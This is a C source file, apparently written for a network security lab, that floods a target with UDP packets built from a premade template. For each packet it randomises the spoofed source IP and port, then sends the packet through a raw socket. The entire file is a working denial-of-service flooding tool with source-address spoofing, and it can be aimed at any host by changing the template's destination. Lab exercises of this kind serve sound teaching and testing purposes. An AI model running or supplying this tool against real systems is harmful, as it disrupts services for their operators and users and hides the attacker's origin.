/* send_premade_udp
* flood a target with udp packets generated from a template premade with generate_udp.py
* the target ip and port is set in generate_udp.py
* Here the source ips and ports are randomly generated
* Usage:
*   ./send_premade_udp premade_udp_packet_file [number_of_packets_to_be_generated]
* 100 packets will be generated and sent out if no number_of_packets_to_be_generated
* e.g.
*   ./send_premade_udp pkt.bin
*   or 
*   ./send_premade_udp pkt.bin 2022
* use wireshark or tcpdump to see a flooding scenario
* Compilation:
*   gcc send_premade_udp.c -o send_premade_udp
* Refs:
* 1. https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versa
* 2. https://stackoverflow.com/questions/27299634/when-to-use-ntohs-and-ntohl-in-c
* 3. https://askubuntu.com/questions/829236/what-is-the-interface-any-that-i-can-see-with-wireshark-and-is-it-safe
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_FILE_SIZE 65536
#define TARGET_IP "10.0.2.69"

int send_packet_raw(int sock, char *ip, int n, struct sockaddr_in *dest_info);

int main(int argc, char *argv[])
{
  int numpkts = 100;
  if (argc < 2)
  {
    printf("Usage: %s premade_udp_packet_file [number_of_packets_to_be_generated]\n", argv[0]);
    return 1;
  }
  if (argc == 3)
  {
    numpkts = atoi(argv[2]);
  }

  char *pktfile = argv[1];
  // Create raw socket
  int enable = 1;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // Read the UDP packet from file
  FILE *f = fopen(pktfile, "rb");
  if (!f)
  {
    printf("Can't open %s\n", pktfile);
    exit(2);
  }
  unsigned char ip[MAX_FILE_SIZE];
  int n = fread(ip, 1, MAX_FILE_SIZE, f);
  printf("Template IP/UDP packet size: %d\n", n);
  fclose(f);

  // Modify and send out UDP packets
  srand(time(0)); // Initialize the seed for random # generation
  for (int i = 0; i < numpkts; i++)
  {
    printf("Spoof and send UDP packet: %d\n", i + 1);
    unsigned short src_port, dst_port;
    unsigned int src_ip, dst_ip;
    struct sockaddr_in sa;
    char str[INET_ADDRSTRLEN];

    // get and show source ip and port
    memcpy(&src_ip, ip + 12, 4);
    memcpy(&src_port, ip + 20, 2);
    src_port = ntohs(src_port);
    sa.sin_addr.s_addr = src_ip;
    inet_ntop(AF_INET, &(sa.sin_addr), str, INET_ADDRSTRLEN);
    printf("Source socket: %s:%d\n", str, src_port);

    // get and show destination ip and port
    memcpy(&dst_ip, ip + 16, 4);
    memcpy(&dst_port, ip + 22, 2);
    dst_port = ntohs(dst_port);
    sa.sin_addr.s_addr = dst_ip;
    inet_ntop(AF_INET, &(sa.sin_addr), str, INET_ADDRSTRLEN);
    printf("Target socket: %s:%d\n", str, dst_port);

    // generate random source ip and port
    src_ip = htonl(rand());
    memcpy(ip + 12, &src_ip, 4); // modify source IP

    src_port = htons(rand());
    memcpy(ip + 20, &src_port, 2); // modify source port

    send_packet_raw(sock, ip, n, &sa); // send packet
  }
  close(sock);
}

int send_packet_raw(int sock, char *ip, int n, struct sockaddr_in *dest_info)
{
  dest_info->sin_family = AF_INET;
  //dest_info->sin_addr.s_addr = inet_addr(TARGET_IP);

  int r = sendto(sock, ip, n, 0, (struct sockaddr*)dest_info,
                 sizeof(struct sockaddr_in));
  if (r >= 0)
    printf("Sent a packet of size: %d\n", r);
  else
    printf("Failed to send packet. Did you run it using sudo?\n");
}
